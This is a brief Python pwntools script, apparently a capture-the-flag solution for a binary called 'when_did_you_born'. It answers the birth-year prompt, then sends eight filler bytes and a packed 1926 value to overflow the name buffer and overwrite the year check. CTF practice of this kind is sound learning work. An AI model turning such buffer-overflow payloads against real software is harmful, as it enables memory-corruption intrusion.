from pwn import *

p = process("./when_did_you_born")

p.sendlineafter("Birth?\n",str(1998))

payload = ""
payload += "A"*8
payload += p32(1926)

p.sendlineafter("Name?\n",payload)

print p.recvall()
